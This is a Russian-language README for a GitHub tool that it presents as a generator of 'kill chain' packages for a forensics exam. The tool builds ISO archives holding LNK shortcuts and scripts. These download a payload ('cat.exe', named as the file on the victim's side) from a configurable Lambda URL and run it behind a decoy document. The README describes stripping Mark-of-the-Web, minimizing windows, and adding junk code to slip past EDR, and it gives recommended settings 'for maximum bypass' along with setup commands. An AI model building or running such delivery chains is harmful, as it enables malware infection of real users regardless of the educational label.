# exam-gen

Автоматический генератор уникальных kill chain пакетов для экзамена по компьютерной криминалистике.

На выходе — **два ZIP-архива на каждый вариант**:
- `VariantName.zip` — Word-версия (ISO с DOCX + kill chain)
- `VariantName_pdf.zip` — PDF-версия (ISO с PDF + kill chain)

Каждый запуск генерирует полностью уникальные артефакты (шифр, имена, хеши).

## Требования

### Python 3.8+

```bash
pip install -r requirements.txt
```

| Пакет | Назначение |
|-------|------------|
| `python-docx` | Модификация DOCX (смена хеша) |
| `pycdlib` | Создание ISO-образов |
| `pylnk3` | Создание .lnk ярлыков |
| `docx2pdf` | Конвертация DOCX -> PDF |

### DOCX -> PDF

| ОС | Что нужно | Установка |
|----|-----------|-----------|
| **Windows** | Microsoft Word | обычно уже есть |
| **Linux** | LibreOffice | `sudo apt install libreoffice-writer` |

## Быстрый старт

### Windows

```powershell
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
copy .env.example .env
# отредактировать .env — вписать LAMBDA_URL и API_KEY
python generate.py
```

### Linux

```bash
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen
pip install -r requirements.txt
sudo apt install libreoffice-writer
cp .env.example .env
nano .env   # вписать LAMBDA_URL и API_KEY
python3 generate.py
```

## Конфигурация

Параметры из **переменных окружения** или `.env` рядом со скриптом.

| Переменная | Обязательная | По умолчанию | Описание |
|------------|:---:|---|---|
| `LAMBDA_URL` | да | — | URL Lambda Function для доставки payload |
| `API_KEY` | да | — | Значение заголовка `X-Api-Key` |
| `TARGET_FILENAME` | нет | `cat.exe` | Имя файла на стороне жертвы |
| `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
| `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP |
| `DELIVERY_METHOD` | нет | `webclient` | `webclient` или `base64_recycle` |
| `LNK_BYPASS` | нет | _(off)_ | Непустое = обход MOTW для LNK |
| `JUNK_CODE` | нет | _(off)_ | Непустое = мусорный код в BAT/PS1 |

Пример `.env`:

```env
LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=your-api-key-here
TARGET_FILENAME=cat.exe
DELIVERY_METHOD=base64_recycle
LNK_BYPASS=1
JUNK_CODE=1
```

Через переменные окружения:

```powershell
# PowerShell
$env:LAMBDA_URL="https://..."; $env:API_KEY="..."; $env:DELIVERY_METHOD="base64_recycle"; $env:LNK_BYPASS="1"; $env:JUNK_CODE="1"; python generate.py
```

```bash
# Bash
LAMBDA_URL='https://...' API_KEY='...' DELIVERY_METHOD=base64_recycle LNK_BYPASS=1 JUNK_CODE=1 python3 generate.py
```

## Опции

### DELIVERY_METHOD

| Метод | Что делает | MOTW |
|-------|-----------|:----:|
| `webclient` | `DownloadFile` → `Start-Process` | есть |
| `base64_recycle` | `DownloadData` → base64 → `WriteAllBytes` → удаление Zone.Identifier | нет |

### LNK_BYPASS

| | Off (по умолчанию) | On |
|---|---|---|
| LNK arguments | `/c "start /min .\bat"` | `/c ".\bat"` |
| Window style | 1 (Normal) | 7 (Minimized) |
| MOTW check на BAT | да | нет |

### JUNK_CODE

Вставляет процедурно-генерируемый мёртвый код в BAT и PS1. Только бытовые операции (математика, строки, даты) — ничего подозрительного для EDR. Имена и паттерны уникальны при каждом запуске.

**Рекомендуемый набор** для максимального обхода:

```powershell
$env:DELIVERY_METHOD="base64_recycle"; $env:LNK_BYPASS="1"; $env:JUNK_CODE="1"; python generate.py
```

## Структура проекта

```
exam-gen/
├── generate.py          # Основной скрипт
├── requirements.txt     # Зависимости
├── .env.example         # Шаблон конфигурации
├── .env                 # Конфиг (не в git)
├── docs/                # Техническая документация
│   └── technical.md     # Детали: обфускация, MOTW, junk code
├── variants/            # ВХОД: папки вариантов с .docx
│   ├── Variant-01/
│   └── Variant-02/
└── output/              # ВЫХОД: готовые ZIP
    ├── Variant-01.zip
    ├── Variant-01_pdf.zip
    └── ...
```

## Проверка результатов

```bash
python3 generate.py

ls output/
# Variant-01.zip  Variant-01_pdf.zip  ...

# Скопировать на Windows → распаковать ZIP → смонтировать ISO
# Видны только LNK + доп. документы
# Клик по LNK → decoy открывается + PS1 запускается
```

## Документация

Подробная техническая документация (как работает обфускация, MOTW bypass, junk code паттерны, пайплайн генерации): **[docs/technical.md](docs/technical.md)**
